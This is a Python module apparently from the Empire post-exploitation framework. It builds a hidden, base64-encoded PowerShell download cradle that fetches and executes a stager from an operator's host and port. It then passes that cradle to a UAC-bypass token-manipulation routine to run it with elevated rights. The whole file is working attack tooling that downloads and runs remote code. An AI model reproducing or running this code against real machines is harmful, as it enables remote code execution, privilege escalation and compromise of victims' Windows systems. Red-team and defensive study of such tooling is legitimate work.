import base64
import re

from empire.server.common.empire import MainMenu
from empire.server.core.module_models import EmpireModule
from empire.server.utils.module_util import handle_error_message


class Module:
    @staticmethod
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):
        # options
        stager = params["Stager"]
        host = params["Host"]
        port = params["Port"]

        # read in the common module source code
        script, err = main_menu.modulesv2.get_module_source(
            module_name=module.script_path,
            obfuscate=obfuscate,
            obfuscate_command=obfuscation_command,
        )

        if err:
            return handle_error_message(err)

        try:
            blank_command = ""
            powershell_command = ""
            encoded_cradle = ""
            cradle = f"IEX \"(new-object net.webclient).downloadstring('{host}:{port}/{stager}')\"|IEX"
            # Remove weird chars that could have been added by ISE
            n = re.compile("(\xef|\xbb|\xbf)")
            # loop through each character and insert null byte
            for char in n.sub("", cradle):
                # insert the nullbyte
                blank_command += char + "\x00"
            # assign powershell command as the new one
            powershell_command = blank_command
            # base64 encode the powershell command

            encoded_cradle = base64.b64encode(powershell_command)

        except Exception:
            pass

        script_end = (
            f'Invoke-BypassUACTokenManipulation -Arguments "-w 1 -enc {encoded_cradle}"; "Invoke-BypassUACTokenManipulation completed"'
        )

        return main_menu.modulesv2.finalize_module(
            script=script,
            script_end=script_end,
            obfuscate=obfuscate,
            obfuscation_command=obfuscation_command,
        )
